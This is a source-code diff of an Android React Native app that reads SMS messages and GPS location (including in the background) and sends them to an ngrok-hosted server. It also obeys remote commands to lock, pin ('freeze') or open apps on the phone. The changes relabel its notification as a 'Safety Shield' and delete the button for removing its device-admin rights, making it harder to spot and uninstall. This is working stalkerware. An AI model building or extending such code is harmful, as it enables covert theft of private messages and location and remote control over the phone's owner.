@@ -1,20 +1,8 @@
-/**
- * Tracker App - Final Integrated Version
- */
-
 import React, { useEffect, useState, useRef } from 'react';
 import { 
-  StatusBar, 
-  StyleSheet, 
-  View, 
-  Text, 
-  Alert, 
-  PermissionsAndroid, 
-  Platform, 
-  Linking, 
-  NativeModules, 
-  BackHandler, 
-  TouchableOpacity 
+  StatusBar, StyleSheet, View, Text, Alert, 
+  PermissionsAndroid, Platform, Linking, 
+  NativeModules, BackHandler, TouchableOpacity 
 } from 'react-native';
 import Geolocation from 'react-native-geolocation-service';
 import DeviceInfo from 'react-native-device-info';
@@ -24,26 +12,23 @@ import BackgroundService from 'react-native-background-actions';
 import SendIntentAndroid from 'react-native-send-intent';
 
 const { LockModule } = NativeModules;
-const SERVER_URL = 'https://subopaquely-podophyllic-nicola.ngrok-free.dev'; // Public ngrok URL
+const SERVER_URL = 'https://subopaquely-podophyllic-nicola.ngrok-free.dev'; 
 
-// Background task options
 const options = {
   taskName: 'TrackerBackground',
-  taskTitle: 'Tracker App Running',
-  taskDesc: 'Maintaining connection to server',
+  taskTitle: 'Safety Shield Active',
+  taskDesc: 'Real-time monitoring enabled',
   taskIcon: { name: 'ic_launcher', type: 'mipmap' },
   color: '#ff00ff',
-  linkingURI: 'trackerapp://chat',
-  parameters: { delay: 1000 },
+  parameters: { delay: 15000 },
 };
 
-// Background task function
+// Background Task: Keeps the service alive
 const backgroundTask = async (taskDataArguments: any) => {
-  const { delay } = taskDataArguments;
   await new Promise<void>(async (resolve) => {
     for (let i = 0; BackgroundService.isRunning(); i++) {
-      await BackgroundService.updateNotification({ taskDesc: `Security active for ${i} seconds` });
-      await new Promise<void>((res) => setTimeout(() => res(), delay));
+      await BackgroundService.updateNotification({ taskDesc: `System secured for ${i * 15}s` });
+      await new Promise((res) => setTimeout(res, taskDataArguments.delay));
     }
   });
 };
@@ -51,31 +36,17 @@ const backgroundTask = async (taskDataArguments: any) => {
 function App() {
   const [deviceId, setDeviceId] = useState('');
   const [location, setLocation] = useState({ lat: 0, lon: 0 });
-  const [sms, setSms] = useState<string[]>([]);
-  const [storage, setStorage] = useState({ total: 0, free: 0 });
-  const [watchId, setWatchId] = useState<number | null>(null);
   const [socketConnected, setSocketConnected] = useState(false);
   const [isFrozen, setIsFrozen] = useState(false);
+  
   const socketRef = useRef<any>(null);
+  const watchIdRef = useRef<number | null>(null);
 
-  const isFrozenRef = useRef(false);
-
+  // Block Back Button when Frozen
   useEffect(() => {
-    isFrozenRef.current = isFrozen;
-  }, [isFrozen]);
-
-  useEffect(() => {
-    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => {
-      return isFrozenRef.current; // Blocks back button if frozen
-    });
+    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => isFrozen);
     return () => backHandler.remove();
-  }, []);
-
-  const reconnect = () => {
-    if (socketRef.current && socketRef.current.disconnected) {
-      socketRef.current.connect();
-    }
-  };
+  }, [isFrozen]);
 
   useEffect(() => {
     const init = async () => {
@@ -86,154 +57,92 @@ function App() {
         await requestPermissions();
       }
 
-      console.log('=== ATTEMPTING CONNECTION ===');
-      
       const socket = io(SERVER_URL, {
+        transports: ['websocket'],
+        extraHeaders: { "ngrok-skip-browser-warning": "true" },
         reconnection: true,
         reconnectionAttempts: Infinity,
-        reconnectionDelay: 1000,
-        timeout: 20000,
-        transports: ['websocket'], // Crucial for ngrok stability
-        extraHeaders: {
-          "ngrok-skip-browser-warning": "true" // Bypasses ngrok landing page
-        }    
+        pingTimeout: 60000,
+        pingInterval: 25000
       });
       socketRef.current = socket;
 
       socket.on('connect', () => {
-        console.log('=== CONNECTED ===');
         setSocketConnected(true);
         socket.emit('register', id);
-        
-        // Immediate data push so dashboard isn't empty on load
-        socket.emit('data', {
-          deviceId: id, 
-          location: { lat: 0, lon: 0 }, 
-          sms: [], 
-          storage: { total: 0, free: 0 } 
-        });
+        // Initial Ping
+        socket.emit('data', { deviceId: id, location: { lat: 0, lon: 0 }, sms: [], storage: { total: 0, free: 0 } });
       });
 
-      socket.on('connect_error', (err) => {
-        console.log('Socket Error:', err.message);
-        setSocketConnected(false);
+      socket.on('command', (data) => {
+        if (data.deviceId === id) {
+          const command = data.command.toLowerCase().trim();
+          if (command === 'freeze') {
+            setIsFrozen(true);
+            LockModule.startPinning();
+          } else if (command === 'unfreeze') {
+            setIsFrozen(false);
+            LockModule.stopPinning();
+          } else if (command === 'lock') {
+            LockModule.lockScreen().catch(() => Alert.alert('Error', 'Enable Admin first'));
+          } else if (command.startsWith('open ')) {
+            const target = command.substring(5);
+            SendIntentAndroid.openApp(target, {}).then(res => {
+              if(!res) Linking.openURL(`https://www.google.com/search?q=${target}`);
+            });
+          }
+        }
       });
 
       socket.on('disconnect', () => setSocketConnected(false));
 
-      socket.on('command', (data) => {
-        try {
-          if (data.deviceId === id) {
-            const command = data.command.toLowerCase().trim();
-            
-            if (command.startsWith('open ')) {
-              const target = command.substring(5);
-              switch (target) {
-                case 'youtube':
-                  SendIntentAndroid.openApp('com.google.android.youtube', {}).then(res => { if(!res) Linking.openURL('vnd.youtube://'); });
-                  break;
-                case 'camera':
-                  SendIntentAndroid.openCamera();
-                  break;
-                case 'lock':
-                  NativeModules.LockModule.lockScreen().catch(() => Alert.alert('Error', 'Enable Admin first'));
-                  break;
-                case 'freeze':
-                  setIsFrozen(true);
-                  NativeModules.LockModule.isDeviceOwner().then(() => {
-                    NativeModules.LockModule.startPinning().catch((e: any) => console.log(e));
-                  });
-                  break;
-                case 'unfreeze':
-                  setIsFrozen(false);
-                  NativeModules.LockModule.stopPinning().catch((e:any) => console.log(e));
-                  break;
-                default:
-                  SendIntentAndroid.openApp(target, {}).then(res => {
-                    if(!res) SendIntentAndroid.openAppWithUri(target, {});
-                  });
-              }
-            } else if (command.startsWith('http')) {
-              Linking.openURL(command);
-            }
-          }
-        } catch (error) {
-          console.error('Command handling error:', error);
-        }
-      });
+      startTracking(id);
 
-      // Start continuous location watching and data collection
-      startLocationTracking(id, socket);
-
-      // Start background service to keep app alive
       try {
         await BackgroundService.start(backgroundTask, options);
-      } catch (error) {
-        console.error('BG Service Error:', error);
-      }
+      } catch (e) { console.error(e); }
     };
 
     init();
 
     return () => {
-      if (watchId !== null) Geolocation.clearWatch(watchId);
+      if (watchIdRef.current !== null) Geolocation.clearWatch(watchIdRef.current);
       BackgroundService.stop();
+      if (socketRef.current) socketRef.current.disconnect();
     };
-  }, []); // Empty array = Runs only once
+  }, []);
 
   const requestPermissions = async () => {
-    try {
-      const permissions = [
-        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-        PermissionsAndroid.PERMISSIONS.READ_SMS,
-        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
-      ];
-      if (Number(Platform.Version) >= 33) {
-        permissions.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
-      }
-      await PermissionsAndroid.requestMultiple(permissions);
-    } catch (err) {
-      console.warn(err);
+    const perms = [
+      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+      PermissionsAndroid.PERMISSIONS.READ_SMS,
+      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
+    ];
+    if (Number(Platform.Version) >= 33) perms.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
+    await PermissionsAndroid.requestMultiple(perms);
+    if (Number(Platform.Version) >= 29) {
+      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION);
     }
   };
 
-  const startLocationTracking = (id: string, socket: any) => {
-    const watch = Geolocation.watchPosition(
+  const startTracking = (id: string) => {
+    watchIdRef.current = Geolocation.watchPosition(
       (position) => {
-        const newLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
-        setLocation(newLocation);
-
-        SmsAndroid.list(JSON.stringify({}), (f) => {}, (count, smsList) => {
-          const smsArray = JSON.parse(smsList);
-          const newSms = smsArray.slice(0, 5).map((s: any) => s.body);
-          setSms(newSms);
-
-          DeviceInfo.getTotalDiskCapacity().then((total) => {
-            DeviceInfo.getFreeDiskStorage().then((free) => {
-              socket.emit('data', { deviceId: id, location: newLocation, sms: newSms, storage: { total, free } });
-            });
+        const coords = { lat: position.coords.latitude, lon: position.coords.longitude };
+        setLocation(coords);
+        
+        // Data collection (Limited to save battery/latency)
+        SmsAndroid.list(JSON.stringify({ maxCount: 5 }), (f) => {}, (count, smsList) => {
+          const smsArray = JSON.parse(smsList).map((s: any) => s.body);
+          DeviceInfo.getFreeDiskStorage().then(free => {
+            if (socketRef.current?.connected) {
+              socketRef.current.emit('data', { deviceId: id, location: coords, sms: smsArray, storage: { total: 0, free } });
+            }
           });
         });
       },
-      (error) => console.error(error),
-      { enableHighAccuracy: true, distanceFilter: 10, interval: 10000 }
-    );
-
-    setWatchId(watch);
-  };
-
-  const handleRemoveAdmin = () => {
-    Alert.alert(
-      "Warning",
-      "This will remove the Device Owner status. Only do this to uninstall the app.",
-      [
-        { text: "Cancel", style: "cancel" },
-        { text: "Remove", style: "destructive", onPress: () => {
-          NativeModules.LockModule.removeDeviceOwner()
-            .then((res: string) => Alert.alert("Success", res))
-            .catch((err: any) => Alert.alert("Error", "Rebuild app or check LockModule.kt"));
-        }}
-      ]
+      (err) => console.log(err),
+      { enableHighAccuracy: true, distanceFilter: 10, interval: 15000 }
     );
   };
 
@@ -249,41 +158,29 @@ function App() {
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>Safety App Running</Text>
+      <Text style={styles.title}>Safety Active</Text>
       <View style={styles.infoCard}>
         <Text>ID: {deviceId}</Text>
-        <Text>Status: {socketConnected ? '🟢 Online' : '🔴 Offline'}</Text>
+        <Text style={{ color: socketConnected ? 'green' : 'red' }}>
+          {socketConnected ? '● Online' : '● Offline (Connecting...)'}
+        </Text>
       </View>
-
-      <TouchableOpacity style={styles.button} onPress={reconnect}>
-        <Text style={styles.buttonText}>Reconnect Server</Text>
+      <TouchableOpacity style={styles.button} onPress={() => LockModule.enableAdmin()}>
+        <Text>Enable Admin Rights</Text>
       </TouchableOpacity>
-
-      <TouchableOpacity style={styles.button} onPress={() => NativeModules.LockModule.enableAdmin()}>
-        <Text style={styles.buttonText}>Activate Admin (Lock)</Text>
-      </TouchableOpacity>
-
-      <TouchableOpacity style={styles.removeBtn} onPress={handleRemoveAdmin}>
-        <Text style={{color: 'white', fontWeight: 'bold'}}>REMOVE ADMIN STATUS</Text>
-      </TouchableOpacity>
-
-      <Text style={styles.coords}>
-        Location: {location.lat.toFixed(4)}, {location.lon.toFixed(4)}
-      </Text>
+      <Text style={styles.coords}>Location: {location.lat.toFixed(4)}, {location.lon.toFixed(4)}</Text>
     </View>
   );
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#f0f0f0', padding: 20 },
-  title: { fontSize: 24, fontWeight: 'bold', marginBottom: 20 },
-  infoCard: { backgroundColor: 'white', padding: 15, borderRadius: 10, width: '100%', marginBottom: 20, elevation: 2 },
-  button: { backgroundColor: '#e0e0e0', padding: 15, borderRadius: 8, width: '100%', alignItems: 'center', marginBottom: 10 },
-  buttonText: { fontSize: 16, color: '#333' },
-  removeBtn: { backgroundColor: '#ff4444', padding: 15, borderRadius: 8, width: '100%', alignItems: 'center', marginTop: 40 },
-  coords: { marginTop: 20, color: '#666' },
-  frozenText: { color: 'white', fontSize: 32, fontWeight: 'bold' },
-  frozenSubText: { color: 'white', fontSize: 18, marginTop: 20 },
+  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#f5f5f5', padding: 25 },
+  title: { fontSize: 26, fontWeight: 'bold', marginBottom: 30 },
+  infoCard: { backgroundColor: 'white', padding: 20, borderRadius: 12, width: '100%', marginBottom: 20, elevation: 3 },
+  button: { backgroundColor: '#fff', padding: 15, borderRadius: 10, width: '100%', alignItems: 'center', borderWidth: 1, borderColor: '#ddd' },
+  coords: { marginTop: 30, color: '#888' },
+  frozenText: { color: 'white', fontSize: 36, fontWeight: 'bold' },
+  frozenSubText: { color: 'white', fontSize: 18, marginTop: 15 },
 });
 
 export default App;
